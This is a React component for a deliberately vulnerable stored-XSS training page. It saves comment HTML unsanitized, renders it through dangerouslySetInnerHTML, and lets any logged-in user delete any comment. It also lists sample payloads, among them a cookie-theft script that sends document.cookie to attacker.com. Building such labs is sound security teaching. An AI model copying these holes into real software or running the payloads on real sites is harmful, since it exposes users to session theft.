import React, { useState, useEffect } from 'react';
import { supabase } from '../lib/supabase';
import { AlertTriangle, MessageSquare, Trash2 } from 'lucide-react';

interface Comment {
  id: string;
  content: string;
  created_at: string;
  user: {
    username: string;
  };
}

function StoredXSS() {
  const [comments, setComments] = useState<Comment[]>([]);
  const [newComment, setNewComment] = useState('');
  const [error, setError] = useState<string | null>(null);
  const [user, setUser] = useState<any>(null);

  const fetchComments = async () => {
    try {
      const { data, error } = await supabase
        .from('comments')
        .select(`
          id,
          content,
          created_at,
          user:user_id (
            username
          )
        `)
        .order('created_at', { ascending: false });

      if (error) throw error;
      setComments(data || []);
    } catch (err: any) {
      setError(err.message);
    }
  };

  const addComment = async () => {
    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) throw new Error('Please login to comment');

      // VULNERABILITY: Storing user input without sanitization
      const { error } = await supabase
        .from('comments')
        .insert([
          {
            content: newComment, // Raw HTML/JS content stored directly
            user_id: user.id
          }
        ]);

      if (error) throw error;
      
      fetchComments();
      setNewComment('');
    } catch (err: any) {
      setError(err.message);
    }
  };

  const deleteComment = async (commentId: string) => {
    try {
      const { error } = await supabase
        .from('comments')
        .delete()
        .eq('id', commentId);

      if (error) throw error;
      fetchComments();
    } catch (err: any) {
      setError(err.message);
    }
  };

  useEffect(() => {
    fetchComments();
    
    // Get current user
    supabase.auth.getUser().then(({ data: { user } }) => {
      setUser(user);
    });
  }, []);

  return (
    <div className="max-w-4xl mx-auto">
      <div className="bg-white rounded-lg shadow-md p-8">
        <div className="flex items-center mb-6">
          <AlertTriangle className="w-8 h-8 text-purple-500 mr-3" />
          <h2 className="text-3xl font-bold text-gray-800">Stored XSS Testing</h2>
        </div>

        <div className="bg-purple-50 border-l-4 border-purple-400 p-4 mb-8">
          <div className="flex items-center">
            <AlertTriangle className="w-5 h-5 text-purple-400 mr-2" />
            <p className="text-purple-700 font-medium">
              This page is intentionally vulnerable to Stored (Persistent) XSS attacks for educational purposes.
            </p>
          </div>
        </div>

        {error && (
          <div className="bg-red-50 text-red-700 p-3 rounded-md mb-4">
            {error}
          </div>
        )}

        {/* Add Comment Section */}
        <div className="bg-gray-50 p-6 rounded-lg mb-8">
          <h3 className="text-xl font-semibold mb-4 text-gray-800 flex items-center">
            <MessageSquare className="w-5 h-5 mr-2" />
            Post a Comment
          </h3>
          
          {!user ? (
            <div className="bg-yellow-50 border border-yellow-200 p-4 rounded-lg">
              <p className="text-yellow-700">Please <a href="/auth" className="text-indigo-600 hover:underline">login</a> to post comments.</p>
            </div>
          ) : (
            <div className="space-y-4">
              <textarea
                value={newComment}
                onChange={(e) => setNewComment(e.target.value)}
                className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-purple-500"
                rows={4}
                placeholder="Enter your comment (HTML and JavaScript will be stored and executed)..."
              />
              <button
                onClick={addComment}
                disabled={!newComment.trim()}
                className="bg-purple-600 text-white px-6 py-2 rounded-lg hover:bg-purple-700 transition-colors disabled:bg-gray-400"
              >
                Post Comment
              </button>
            </div>
          )}
        </div>

        {/* Educational Payloads */}
        <div className="bg-yellow-50 p-6 rounded-lg mb-8">
          <h3 className="text-xl font-semibold mb-4 text-gray-800">Test Payloads for Stored XSS</h3>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
            <div>
              <p className="font-medium mb-2">Basic Alert:</p>
              <code className="bg-gray-200 p-2 rounded block">&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code>
            </div>
            <div>
              <p className="font-medium mb-2">Image with Error:</p>
              <code className="bg-gray-200 p-2 rounded block">&lt;img src=x onerror=alert('XSS')&gt;</code>
            </div>
            <div>
              <p className="font-medium mb-2">SVG Payload:</p>
              <code className="bg-gray-200 p-2 rounded block">&lt;svg onload=alert('XSS')&gt;&lt;/svg&gt;</code>
            </div>
            <div>
              <p className="font-medium mb-2">Cookie Theft:</p>
              <code className="bg-gray-200 p-2 rounded block">&lt;script&gt;fetch('//attacker.com?c='+document.cookie)&lt;/script&gt;</code>
            </div>
          </div>
        </div>

        {/* Comments Display - Vulnerable to Stored XSS */}
        <div className="space-y-6">
          <h3 className="text-xl font-semibold text-gray-800">Comments ({comments.length})</h3>
          
          {comments.length === 0 ? (
            <div className="text-center py-8 text-gray-500">
              No comments yet. Be the first to post!
            </div>
          ) : (
            <div className="space-y-4">
              {comments.map((comment) => (
                <div key={comment.id} className="bg-white border border-gray-200 rounded-lg p-4">
                  <div className="flex justify-between items-start mb-3">
                    <div className="flex items-center space-x-2">
                      <span className="font-medium text-purple-600">
                        {comment.user?.username || 'Anonymous'}
                      </span>
                      <span className="text-sm text-gray-500">
                        {new Date(comment.created_at).toLocaleString()}
                      </span>
                    </div>
                    {user && (
                      <button
                        onClick={() => deleteComment(comment.id)}
                        className="text-red-500 hover:text-red-700 p-1"
                        title="Delete comment"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    )}
                  </div>
                  
                  {/* VULNERABILITY: Direct HTML rendering without sanitization */}
                  <div 
                    className="prose max-w-none"
                    dangerouslySetInnerHTML={{ __html: comment.content }}
                  />
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Educational Information */}
        <div className="mt-8 bg-blue-50 p-6 rounded-lg">
          <h3 className="text-xl font-semibold mb-4 text-gray-800">About Stored XSS</h3>
          <div className="space-y-2 text-gray-700">
            <p>• <strong>Stored XSS</strong> occurs when malicious scripts are permanently stored on the target server</p>
            <p>• The malicious script is served to users when they access the stored information</p>
            <p>• This is often considered the most dangerous type of XSS as it affects all users who view the content</p>
            <p>• Common attack vectors include comment systems, user profiles, and message boards</p>
            <p>• Prevention: Always sanitize and validate user input before storing and displaying it</p>
          </div>
        </div>
      </div>
    </div>
  );
}

export default StoredXSS;